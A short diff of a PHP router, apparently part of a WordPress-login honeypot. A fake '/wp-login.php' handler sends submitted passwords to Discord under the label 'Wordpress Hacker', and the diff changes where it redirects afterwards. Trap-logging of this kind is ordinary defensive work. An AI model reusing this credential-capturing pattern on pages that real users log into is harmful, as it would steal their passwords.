@@ -1123,7 +1123,7 @@ $router->post('/wp-login.php', function() {
    **Password:** ${pass}
    ";
    Rocks::newDiscord($log_m, "Wordpress Hacker");
-   header("Location: /admin/upload/");
+   header("Location: /wp-login.php");
    die();
 });
 
